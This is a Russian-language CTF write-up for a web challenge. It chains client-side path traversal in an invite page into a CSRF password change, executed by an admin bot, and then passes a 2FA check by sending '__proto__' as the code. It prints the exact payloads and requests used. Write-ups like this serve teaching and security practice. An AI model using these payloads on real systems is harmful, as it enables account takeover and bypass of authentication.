# СоюзМультГиф
**CyberCTF 2026**

Первым делом разберёмся, где вообще лежит флаг и кому он достаётся. В бэкенде есть ровно одно место, где флаг покидает сервер, — это ответ на успешный ввод 2FA, причём только для админа:

```
if (login === 'admin') {
    res.cookie('flag', FLAG, { httpOnly: true });
}
```

То есть задача сводится к одному: как-то залогиниться под `admin` и дойти до конца формы 2FA. Админ заведён при старте, но пароль каждый раз случайный и игроку неизвестен. Двухфакторка у него включена с самого старта:

```
users['admin'] = {
  login: 'admin',
  passwordHash: sha256(adminPassword),
  enabled2FA: true,
  ...
};

if (user.enabled2FA) {
    await call2fa('POST', '/generate', { login: login });
    return res.json({ require2FA: true, login });
}
```

Даже если бы пароль был известен, этого мало: для аутентификации нужен второй фактор - одноразовый код. Код генерируется на отдельном 2fa-сервисе, который наружу не проброшен. Значит, честно получить код не выйдет — придётся обходить проверку. Отложим это на потом и вернёмся к паролю.

Посмотрим, как вообще меняется пароль пользователя:

```
app.put('/api/user/password', (req, res) => {
  const { newPassword } = req.query;
  const authToken = req.cookies.auth;
  if (!authToken) return res.status(401).json({ error: 'Unauthorized' });
  const user = findUserBySession(authToken);
  ...
  user.passwordHash = crypto.createHash('sha256').update(newPassword).digest('hex');
```

Здесь сразу бросается в глаза несколько проблем. Новый пароль берётся из query-строки, то есть целиком помещается в URL. Никакого CSRF-токена нет, Origin и Referer никто не проверяет — достаточно, чтобы в запросе улетела кука `auth`. Получается классический CSRF: если заставить браузер жертвы сделать такой `PUT`, пароль сменится на наш. Своей сессией пароль админа, разумеется, не поменять — нужна сессия самого админа.

А вот и способ её задействовать — бот. Его эндпоинт `POST /visit` принимает любой URL и перед тем, как по нему перейти, сам заходит в аккаунт админа (пароль читает из того же файла, что записал backend, код 2FA — с внутреннего сервиса):

```
if (req.method === 'POST' && parsedUrl.pathname === '/visit') {
    ...
    targetUrl = json.url;
    visitUrl(targetUrl)
}

await page.type('input[placeholder="Логин"]', 'admin');
await page.type('input[placeholder="Пароль"]', PASSWORD);
await page.click('#login-btn');
...
await page.goto(targetUrl, { waitUntil: 'networkidle2' });
```

То есть бот — это и есть наша «жертва» с валидной сессией админа. Осталось придумать, какую ссылку ему скормить, чтобы из его браузера ушёл нужный `PUT`. Просто отдать боту `/api/user/password` не получится: это кросс-доменный запрос с чужой страницы, его срежет браузер. Нам нужна страница на самом фронтенде, которая сама сходит на API. И такая есть — обработчик приглашений.

`AcceptInvite` читает параметры из query и подставляет их в путь запроса конкатенацией строк, без какой-либо проверки:

```
const params = new URLSearchParams(window.location.search);
const action = params.get('action');
const cartoonId = params.get('cartoonId');
const token = params.get('token');

if (action === 'join' && cartoonId && token) {
    const url = `/api/cartoons/${cartoonId}/invites/${token}`;
    axios.put(url, {}, { withCredentials: true })
```

Проблема в том, что `cartoonId` и `token` попадают в URL как есть. А браузер, перед тем как отправить запрос, сам нормализует путь: схлопывает `..` и обрезает всё после первого `?` в query-строку. Значит, если в `cartoonId` подсунуть не число, а кусок пути с переходами наверх и собственным `?`, то хвост `/invites/${token}` перестанет быть частью пути и уедет в query — на итоговый маршрут он больше не повлияет. Это и есть client-side path traversal.

Нормальная ссылка-приглашение выглядит так:

```
/invite?action=join&cartoonId=1&token=<hex>
```

Подменяем `cartoonId` на путь к смене пароля и прямо внутри него открываем query, чтобы `newPassword` доехал до бэкенда:

```
cartoonId = ../../../../api/user/password?newPassword=hacked123&a=a
token     = ../
```

Тогда `AcceptInvite` склеит такую строку:

```
/api/cartoons/../../../../api/user/password?newPassword=hacked123&a=a/invites/../
```

А после нормализации пути браузером из неё получится совсем другой запрос:

```
PUT /api/user/password?newPassword=hacked123&a=a/invites/../
```

Разберём, почему пэйлоад собран именно так. Знак `?` внутри `cartoonId` открывает query-строку: всё, что `AcceptInvite` дописывает дальше (`/invites/../`), становится значением безобидного параметра `a`, а не частью пути. Без этого `?` хвост остался бы в пути, адрес свернулся бы в `/api/user/password/`, и `newPassword` просто не попал бы в query — бэкенд ответил бы `400`. Поэтому `a=a` и нужен: он «съедает» лишний хвост. При этом `token` обязан быть непустым — иначе не выполнится условие `cartoonId && token` и запрос вообще не уйдёт.

Теперь отдаём готовую ссылку боту. Важная деталь: адрес должен указывать на имя сервиса внутри docker-сети (`http://frontend/...`). Если дать `localhost`, бот откроет сам себя — Chromium резолвит `localhost` в контейнер бота, а не во фронтенд.

```
POST /visit
{"url":"http://frontend/invite?action=join&cartoonId=../../../../api/user/password%3FnewPassword%3Dhacked123%26a%3Da&token=../"}
```

Бот заходит под админом, открывает `/invite`, страница сама делает `PUT` с его кукой — и пароль админа становится `hacked123`.

Дальше логинимся уже сами с новым паролем:

```
POST /api/login
{"login":"admin","password":"hacked123"}
```

В ответ приходит `{ "require2FA": true, "login": "admin" }` — пароль действительно наш, но сессию ещё не дают: сервер сгенерировал одноразовый код и ждёт его. Вот тут и возвращаемся к отложенной проблеме 2FA. Код нам недоступен, значит, надо найти слабость в самой проверке.

Смотрим на 2fa-сервис. Коды он хранит в обычном объекте, где **ключ** — это сам OTP, а значение — логин:

```
const pendingCodes = {};  // { "482916": "admin" }

function issueOTP(login) {
    const code = generateRandom6Digit();
    pendingCodes[code] = login;
}

app.post('/check', (req, res) => {
    const { login, code } = req.body;
    if (pendingCodes[code]) {           // уязвимость
        return res.status(200).json({ success: true });
    }
    return res.status(403).json({ success: false });
});
```

Вся проверка держится на строчке `if (pendingCodes[code])`. Казалось бы, если такого кода не было, то и свойства нет, и условие ложно. Но обращение по ключу в JavaScript работает иначе: если в самом объекте ключа нет, движок идёт искать его вверх по цепочке прототипов. У любого `{}` прототип — это `Object.prototype`, а там уже лежат готовые свойства: `constructor`, `toString`, `valueOf`, `hasOwnProperty` и, в том числе, `__proto__`. Все они — функции или объекты, то есть в `if` дают `true`.

Получается, достаточно прислать в качестве кода имя любого такого свойства. Сервер ничего не мутирует — он просто читает чужое унаследованное свойство и принимает его за валидный код. Отправляем:

```
POST /api/login/2fa
{"login":"admin","code":"__proto__"}
```

```
pendingCodes["__proto__"]
//  -> Object.prototype  (значение «истинно»)
//  -> if () проходит, сервер отдаёт сессию админа
```

Никакого настоящего OTP мы не знали, но проверку прошли. В ответе прилетает `Set-Cookie: flag=...` вместе с новой кукой `auth` — это и есть флаг.

Всю цепочку автоматизирует готовый скрипт:

```
python3 solve.py --target http://localhost:3000 --bot http://localhost:8080
```

#web #xss #2fa #bypass